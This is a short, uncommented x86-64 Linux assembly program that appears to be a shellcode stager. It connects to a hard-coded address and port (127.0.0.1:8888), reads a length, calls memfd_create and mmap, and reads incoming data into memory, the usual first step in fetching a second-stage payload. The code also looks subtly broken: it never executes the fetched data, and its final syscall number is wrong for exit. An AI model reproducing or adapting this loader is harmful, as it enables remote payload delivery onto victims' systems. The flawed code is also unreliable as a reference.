section .text
global _start

_start:
	push 0x29
	pop rax
	cdq
	push 0x2
	pop rdi
	push 0x1
	pop rsi
	syscall

	xchg rdi, rax
	mov rcx, 0x100007fb8220002
	push rcx
	mov rsi, rsp
	push 0x10
	pop rdx
	push 0x2a
	pop rax
	syscall

	push 0x4
	pop rdx
	push 0x0
	lea rsi, [rsp]
	push 0x0
	pop rax
	syscall

	pop r11
	push rdi
	pop r12

	xor rax, rax
	push rax
	push rsp
	sub rsp, 8
	mov rdi, rsp
	push 0x13f
	pop rax
	xor rsi, rsi
	syscall

	push rax
	pop r13

	xor rdi, rdi
	mov rsi, r11
	mov rdx, 1
	mov r10, 2
	xor r8, r8
	xor r9, r9
	mov rax, 0x9
	syscall

	test rax, rax
	js fail

	push rax
	pop rsi
	push r12
	pop rdi
	push r11
	pop rdx
	push 0x0
	pop rax
	syscall

fail:
	push 0x60
	pop rax
	xor rdi, rdi
	syscall
